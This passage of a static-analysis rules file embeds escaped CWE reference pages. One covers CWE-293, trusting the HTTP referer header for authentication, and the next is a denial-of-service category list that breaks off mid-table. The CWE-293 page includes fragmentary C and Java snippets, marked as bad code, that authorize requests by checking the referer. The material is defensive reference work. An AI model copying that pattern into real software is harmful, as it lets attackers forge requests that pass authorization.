&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;293&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_293_Description" id="oc_293_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The referer field in HTTP requests can be easily modified and,
as such, is not a valid means of message integrity
checking.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Alternate Terms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Alternate Terms&lt;/div&gt;&lt;div name="oc_293_Alternate Terms" id="oc_293_Alternate Terms" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;referrer:&lt;/th&gt;&lt;td valign="top" width="100%"&gt;

&lt;p&gt;While the proper spelling might be regarded as "referrer," the HTTP
RFCs and their implementations use "referer," so this is regarded as the
correct spelling.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_293_Time of Introduction" id="oc_293_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_293_Applicable Platforms" id="oc_293_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;All&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_293_Common Consequences" id="oc_293_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Authorization&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Actions, which may not be authorized otherwise, can be carried out as
if they were validated by the server referred to.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Accountability&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Actions may be taken in the name of the server referred to.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Likelihood of Exploit"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Likelihood of Exploit&lt;/div&gt;&lt;div name="oc_293_Likelihood of Exploit" id="oc_293_Likelihood of Exploit" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;High&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_293_Demonstrative Examples" id="oc_293_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example Languages: &lt;/span&gt;C and C++&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;sock= socket(AF_INET, SOCK_STREAM, 0);&lt;/div&gt;&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;&lt;div style="font-size:90%;"&gt;bind(sock, (struct sockaddr *)&amp;amp;server, len)&lt;/div&gt;&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;&lt;div style="font-size:90%;"&gt;while (1) newsock=accept(sock, (struct sockaddr *)&amp;amp;from,
&amp;amp;fromlen);&lt;/div&gt;&lt;div style="font-size:90%;"&gt;pid=fork();&lt;/div&gt;&lt;div style="font-size:90%;"&gt;if (pid==0) {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;n = read(newsock,buffer,BUFSIZE);&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;if (buffer+...==Referer: http://www.foo.org/dsaf.html) //do
stuff&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;public class httpd extends Thread {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;Socket cli;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;public httpd(Socket serv) {&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;cli=serv;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;start();&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;public static void main(String[] a) {&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;ServerSocket&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;serv=new ServerSocket(8181);&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;for(;;) {&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;new h(serv.accept());&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;public void run() {&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;try {&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;BufferedReader reader = new BufferedReader(new
InputStreamReader(cli.getInputStream())); //if i
contains a the proper referer.&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;DataOutputStream o= new
DataOutputStream(c.getOutputStream());&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_293_Potential Mitigations" id="oc_293_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;In order to usefully check if a given action is authorized, some means
of strong authentication and method protection must be used. Use other
means of authorization that cannot be simply spoofed. Possibilities
include a username/password or certificate.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Background Details"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Background Details&lt;/div&gt;&lt;div name="oc_293_Background Details" id="oc_293_Background Details" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;The referer field in HTML requests can be simply modified by malicious
users, rendering it useless as a means of checking the validity of the
request in question.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_293_Relationships" id="oc_293_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;290&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=290" target="_blank"&gt;Authentication Bypass by Spoofing&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;PeerOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Compound Element: Composite&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;291&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=291" target="_blank"&gt;Trusting Self-reported IP Address&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;PeerOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;292&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=292" target="_blank"&gt;Trusting Self-reported DNS Name&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relevant Properties"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relevant Properties&lt;/div&gt;&lt;div name="oc_293_Relevant Properties" id="oc_293_Relevant Properties" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Mutability&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_293_Taxonomy Mappings" id="oc_293_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;CLASP&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Using referrer field for authentication&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_293_Content History" id="oc_293_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CLASP&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Alternate Terms, Background Details,
Common Consequences, Relationships, Relevant Properties,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2127</key><name>Parse_Double_DoS</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;OWASP Top Ten 2004 Category A9 - Denial of Service&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Category ID: &lt;/b&gt;730&lt;span style="font-style:italic; font-size:80%"&gt; (Category)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_730_Description" id="oc_730_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;Weaknesses in this category are related to the A9 category in
the OWASP Top Ten 2004.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_730_Relationships" id="oc_730_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;

&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;170&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=170" target="_blank"&gt;Improper Null Termination&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;248&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=248" target="_blank"&gt;Uncaught Exception&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;369&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=369" target="_blank"&gt;Divide By Zero&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;382&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=382" target="_blank"&gt;J2EE Bad Practices: Use of System.exit()&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;400&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=400" target="_blank"&gt;Uncontrolled Resource Consumption ('Resource Exhaustion')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;401&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=401" target="_blank"&gt;Failure to Release Memory Before Removing Last Reference ('Memory Leak')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;404&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=404" target="_blank"&gt;Improper Resource Shutdown or Release&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;405&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=405" target="_blank"&gt;Asymmetric Resource Consumption (Amplification)&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;410&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=410" target="_blank"&gt;Insufficient Resource Pool&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;412&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=412" target="_blank"&gt;Unrestricted Externally Accessible Lock&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span 